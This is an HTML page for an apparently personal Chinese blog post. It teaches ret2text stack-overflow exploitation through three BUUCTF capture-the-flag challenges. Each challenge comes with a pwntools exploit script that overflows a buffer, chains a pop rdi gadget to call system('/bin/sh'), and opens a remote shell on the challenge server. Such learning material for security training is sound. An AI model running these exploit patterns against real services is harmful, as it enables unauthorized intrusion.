@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Ret2text漏洞是一种攻击技术，它通过覆盖函数的返回地址，使程序的执行流跳转到程序自身的可执行文本段中预设的“gadgets”代码片段，以此绕过某些安全机制并执行攻击者的代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2text学习总结">
+<meta property="og:url" content="http://example.com/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="Ret2text漏洞是一种攻击技术，它通过覆盖函数的返回地址，使程序的执行流跳转到程序自身的可执行文本段中预设的“gadgets”代码片段，以此绕过某些安全机制并执行攻击者的代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359254.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359586.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359141.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359026.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000446.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000814.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000599.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000641.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001116.png">
+<meta property="article:published_time" content="2023-12-07T15:45:07.000Z">
+<meta property="article:modified_time" content="2025-10-16T13:32:02.571Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png">
+
+<link rel="canonical" href="http://example.com/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ret2text学习总结 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2text学习总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-07 23:45:07" itemprop="dateCreated datePublished" datetime="2023-12-07T23:45:07+08:00">2023-12-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 21:32:02" itemprop="dateModified" datetime="2025-10-16T21:32:02+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%A0%88/" itemprop="url" rel="index"><span itemprop="name">栈</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Ret2text漏洞是一种攻击技术，它通过覆盖函数的返回地址，使程序的执行流跳转到程序自身的可执行文本段中预设的“gadgets”代码片段，以此绕过某些安全机制并执行攻击者的代码。</p>
+<span id="more"></span>
+
+<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="什么是ret2text"><a href="#什么是ret2text" class="headerlink" title="什么是ret2text"></a>什么是<code>ret2text</code></h3><p>​	<code>ret2text</code>，即<code>return to text</code>，意思是劫持函数返回地址为程序本身就有的代码(<code>.text</code>)，进而控制程序执行后门函数，拿到<code>shell</code>。</p>
+<h3 id="strcpy函数溢出"><a href="#strcpy函数溢出" class="headerlink" title="strcpy函数溢出"></a><code>strcpy</code>函数溢出</h3><ul>
+<li><p>当源字符串的长度大于目标缓冲区时，<code>strcpy</code>函数会复制整个源字符串，导致栈溢出。</p>
+</li>
+<li><p><code>strcpy</code>函数原型</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* destination,<span class="type">const</span> <span class="type">char</span>* source)</span>;</span><br><span class="line"><span class="comment">//destination指向要复制的目标缓冲区</span></span><br><span class="line"><span class="comment">//source指向被复制的源字符串</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2text题目类型"><a href="#ret2text题目类型" class="headerlink" title="ret2text题目类型"></a><code>ret2text</code>题目类型</h3><p>​	第一种是直接劫持返回地址为<code>system(&quot;/bin/sh&quot;)</code>的地址。</p>
+<p>​	第二种比第一种稍微复杂了一些，虽然有<code>system</code>函数但是参数不是我们想要的 ，而在程序的其他地方也能找到<code>/bin/sh</code>字符串。这时就需要利用一些<code>gadget</code>给<code>system</code>函数传参。而64位程序和32位程序二者的传参方式也不同。</p>
+<h3 id="64位程序和32位程序在函数传参上的不同"><a href="#64位程序和32位程序在函数传参上的不同" class="headerlink" title="64位程序和32位程序在函数传参上的不同"></a>64位程序和32位程序在函数传参上的不同</h3><p>​	32位程序函数传参时，使用栈来传递参数（如<code>_cdecl</code>和<code>_stdcall</code>），参数从右往左压入栈，然后执行<code>call</code>指令跳转到要执行的函数的位置。因此我们攻击时只需构造一个栈结构即可。</p>
+<p>​	64位程序函数传参时，先使用寄存器来存储参数，一共有6个存放参数的寄存器分别为<code>rdi,rsi,rdx,rcx,r8,r9</code>，当参数大于6个时多余的参数才通过栈传递。</p>
+<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a><code>gadget</code></h3><p>​	<code>gadget</code>通常是以<code>ret</code>结尾的指令序列，如<code>pop rdi ; ret</code>，用于设置寄存器的值。在这里，我们用<code>pop rdi ; ret</code>把<code>/bin/sh</code>放入<code>rdi</code>寄存器中。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题1：buu-jarvisoj-level0"><a href="#例题1：buu-jarvisoj-level0" class="headerlink" title="例题1：buu  jarvisoj_level0"></a><strong>例题1</strong>：<code>buu</code>  <code>jarvisoj_level0</code></h3><p>拿到题目后先<code>checksec level0</code>命令检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>（堆栈不执行）保护。该程序为64位。</p>
+<blockquote>
+<p>​	<strong><code>canary</code>保护：函数开始执行的时候会先往栈里插入<code>canary</code>值，当函数真正返回的时候会验证<code>canary</code>值是否合法，如果不合法就停止程序运行。可以防止栈溢出覆盖返回地址。</strong></p>
+</blockquote>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png" alt="image-20231207130909272" style="zoom:80%;" />
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359254.png" alt="image-20231207131026174"></p>
+<p>定义数组<code>buf[128]</code>,<code>read</code>函数读取，且<code>0x200uLL</code>大于128，可以栈溢出。通过下图</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359093.png" alt="image-20231207131620028"></p>
+<p>计算偏移量，为0x80+8</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359586.png" alt="image-20231207131114573"></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001740.png" alt="image-20231207131155073"></p>
+<p>该题是第一种类型，直接溢出并劫持返回地址为<code>system</code>函数地址0x400596，即可。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359141.png" alt="image-20231207132517025"></p>
+<p>最后<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27059</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359026.png" alt="image-20231207132411895"></p>
+<h3 id="例题2：buu-jarvisoj-level2-x64"><a href="#例题2：buu-jarvisoj-level2-x64" class="headerlink" title="例题2：buu  jarvisoj_level2_x64"></a>例题2：<code>buu</code>  <code>jarvisoj_level2_x64</code></h3><p>拿到题目后先检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359564.png" alt="image-20231207111803128"></p>
+<p>把题目放入<code>ida</code>里，查看</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000446.png" alt="image-20231207113118006" style="zoom: 80%;" />
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000356.png" alt="image-20231207113230907"></p>
+<p>定义了一个数组<code>buf[128]</code>，有<code>read</code>函数<code>0x200uLL</code>明显大于128，可以栈溢出。计算偏移量，为0x80+8</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000814.png" alt="image-20231207121308672"></p>
+<p>有<code>system</code>函数还是两个，但是参数都不是我们想要的。再查看一下字符串(<code>shift+F12</code>)</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000093.png" alt="image-20231207113459891"></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000599.png" alt="image-20231207113617885"></p>
+<p>很好，有<code>/bin/sh</code>点进去查看地址，为0x600a90，随便选一个<code>system</code>的地址为0x400603</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000124.png" alt="image-20231207115950982"></p>
+<p>我们要做的就是通过<code>pop rdi;ret</code>把<code>/bin/sh</code>传参给<code>system</code>函数，通过<code>ROPgadget --binary level2_x64 | grep &quot;pop rdi&quot;</code>命令得到<code>pop rdi ; ret</code>地址，如下</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000948.png" alt="image-20231207120209890"></p>
+<p>最后<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400603</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi_addr)+p64(bin_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#按顺序写入，为什么是这个顺序我也不知道</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop rdi控制第一个参数，ret衔接下一条指令</span></span><br><span class="line"><span class="comment">#pop rdi把bin_addr这个地址弹到了rdi寄存器中，ret执行触发system_addr</span></span><br><span class="line"><span class="comment">#调试一下看的很清楚，这也不知道，那也不知道，你知道啥，你这不知道  这题就不算弄懂了，不要得过且过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>flag</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000641.png" alt="image-20231207120706744"></p>
+<h3 id="例题3：buu-jarvisoj-level2"><a href="#例题3：buu-jarvisoj-level2" class="headerlink" title="例题3：buu  jarvisoj_level2"></a>例题3：<code>buu</code>  <code>jarvisoj_level2</code></h3><p>前面几步都同上，我就不再多说。</p>
+<p>如下，<code>system</code>的地址0x0804849e，偏移量0x88+4</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000611.png" alt="image-20231207193202760"></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001200.png" alt="image-20231207193238143"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231207193505701](https://raw.githubusercontent.com/Qwen11/picture/main/202503140001790.png)</span><br><span class="line"></span><br><span class="line">最后```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28486)</span><br><span class="line"></span><br><span class="line">system_addr = 0x0804849e</span><br><span class="line">shell_addr = 0x0804a024</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(8)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88)+p32(0xffffe000)+p32(system_addr)+p32(0xffffe000)+p32(shell_addr)</span><br><span class="line">#因为这个p32(8)的位置是你调用system函数的返回地址，也就是system函数执行后要执行的地址。而system函数执行了命令/bin/sh后会开启一个子进程阻塞当前的进程，所以system函数不会返回，这个地址8也就不会被跳转，这里你可以换成任意一个值都能成功，也就解释了为什么写了一个非法地址但程序不会崩溃 ，因为system压根就没返回</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>flag</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001116.png" alt="image-20231207193934134"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%88/" rel="tag"># 栈</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/BUU%E5%88%B7%E9%A2%98/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DNot%20Bad/" rel="prev" title="极客大挑战 2019 Not Bad">
+      <i class="fa fa-chevron-left"></i> 极客大挑战 2019 Not Bad
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ret2shellcode%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="next" title="ret2shellcode学习总结">
+      ret2shellcode学习总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前提知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFret2text"><span class="nav-number">1.1.</span> <span class="nav-text">什么是ret2text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcpy%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.</span> <span class="nav-text">strcpy函数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text%E9%A2%98%E7%9B%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">ret2text题目类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%92%8C32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="nav-number">1.4.</span> <span class="nav-text">64位程序和32位程序在函数传参上的不同</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gadget"><span class="nav-number">1.5.</span> <span class="nav-text">gadget</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Abuu-jarvisoj-level0"><span class="nav-number">2.1.</span> <span class="nav-text">例题1：buu  jarvisoj_level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%9Abuu-jarvisoj-level2-x64"><span class="nav-number">2.2.</span> <span class="nav-text">例题2：buu  jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%983%EF%BC%9Abuu-jarvisoj-level2"><span class="nav-number">2.3.</span> <span class="nav-text">例题3：buu  jarvisoj_level2</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
